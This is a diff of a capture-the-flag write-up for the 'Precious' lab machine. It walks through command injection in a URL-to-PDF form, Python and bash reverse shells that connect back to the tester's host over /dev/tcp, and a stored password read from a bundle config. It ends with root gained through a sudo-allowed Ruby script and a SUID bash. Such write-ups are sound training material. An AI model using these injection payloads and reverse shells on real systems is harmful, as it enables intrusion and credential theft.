@@ -1,4 +1,4 @@
-# Precious [In Progress]
+# Precious
 
 ## Service and Port Enumeration
 
@@ -65,10 +65,9 @@ So, we supply a url and it will print a pdf with its contents
 - I could have it, for instance, print the contents of my current directory
     - All i'd need to do is set up a network listener
 
-So let's prop up a python web server: `python3 -m http.server 80`
+So let's prop up a netcat listener: `nc -lvnp 80`
 ```
-└─$ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+listening on [any] 80 ...
 ```
 
 Then we inject our IP address into the text field
@@ -87,7 +86,7 @@ We get a PDF in a new tab with the contents of our directory!
 
 When we try
 ```
-'http://10.10.14.37/?name=#{`echo hello`}'
+'http://10.10.14.37:80/?name=#{`echo hello`}'
 ```
 
 We get the following:
@@ -112,7 +111,7 @@ Also not what we were looking for!
 
 Running
 ```
-"http://10.10.14.37/?name=#{'%20`echo hello`'}"
+"http://10.10.14.37:80/?name=#{'%20`echo hello`'}"
 ```
 
 We get:
@@ -128,7 +127,7 @@ So the instruction looks as though it were processed, but we don't know for sure
 
 Let's try a command that we can more easily verify:
 ``` 
-http://10.10.14.37/?name=#{'%20`sleep 5`'}
+http://10.10.14.37:80/?name=#{'%20`sleep 5`'}
 ```
 
 We see the browser sleep for 5 seconds and then post the HTTP response
@@ -137,7 +136,7 @@ We see the browser sleep for 5 seconds and then post the HTTP response
 
 When running this as input:
 ```
-http://10.10.14.37/?name=#{'%20`python3 -c 'import pty,socket;s=socket.socket();s.connect(("10.10.14.37", 80));pty.spawn("/bin/bash")'`'}
+http://10.10.14.37:80/?name=#{'%20`python3 -c 'import pty,socket;s=socket.socket();s.connect(("10.10.14.37", 80));pty.spawn("/bin/bash")'`'}
 ```
 
 Our session hangs - which is also a good sign! But we're not seeing a shell spawn:
@@ -145,4 +144,115 @@ Our session hangs - which is also a good sign! But we're not seeing a shell spaw
 10.10.11.189 - - [17/Dec/2022 13:48:30] "GET /?name= HTTP/1.1" 200 -
 ```
 
+How about the bash equivalent?
+```
+http://10.10.14.37:80/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.37/80 0>&1"`'}
+```
 
+> The above bash code wraps a bash command in double quotes
+> `bash -i` gives us an interactive session
+> `>%` operator is used to duplicate output file descriptors
+> output is redirected to the TCP socket that will be opened up 
+> the socket will have the format `/dev/<proto>/<ip>/<port>`
+> `0>&1`: continue to listen for stdin, and redirect to stdout [critical]
+
+Basically, we:
+- spawn an interactive shell
+- redirect the shell output to wherever our network listener is
+- redirect our input to wherever shell output is being directed 
+
+And we get a shell!
+```
+connect to [10.10.14.37] from (UNKNOWN) [10.10.11.189] 36034
+bash: cannot set terminal process group (680): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.1$ 
+```
+
+If we navigate to `/home/ruby/.bundle`, and `cat config`, we get:
+```
+bash-5.1$ cat config
+cat config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+bash-5.1$ 
+```
+
+Looks like we have henry's creds!
+Let's try to `ssh` in with them
+```
+└─$ ssh henry@10.10.11.189
+henry@10.10.11.189's password: 
+Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Dec 17 21:59:55 2022 from 10.10.14.7
+-bash-5.1$ 
+```
+
+And we're logged in as henry!
+```
+$ cat user.txt
+e9554ffbd13a4bb816158e664cd2a763
+```
+
+And we have the flag
+
+---
+
+## PrivEsc
+
+Checking our permissions, we see we have:
+```
+-bash-5.1$ sudo -l
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+So it looks like `/opt/update_dependencies.rb` loads a `dependencies.yml` file:
+```
+require "yaml"
+require 'rubygems'
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+```
+
+If we run `sudo /usr/bin/ruby /opt/update_dependencies.yml`, we get:
+```
+1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
+```
+
+When looking at our dependencies.yml, we see a reference for `u+s /bin/bash`, same with the dependiencies.yaml
+
+So there's a change in permissions for `/bin/bash`. Our current permissions with `/bin/bash` are:
+```
+-bash-5.1$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+-bash-5.1$ 
+```
+
+We see some `suid` bit enablement in the above permissions
+- This suggests that we could try toggling `/bin/bash -p`
+
+We can run `/bin/bash -p` to run `bash` as the effective user (meaning that it can be enabled when `ruid` and `euid` do not match).
+```
+-bash-5.1#
+```
+
+And we have root, and can get the flag
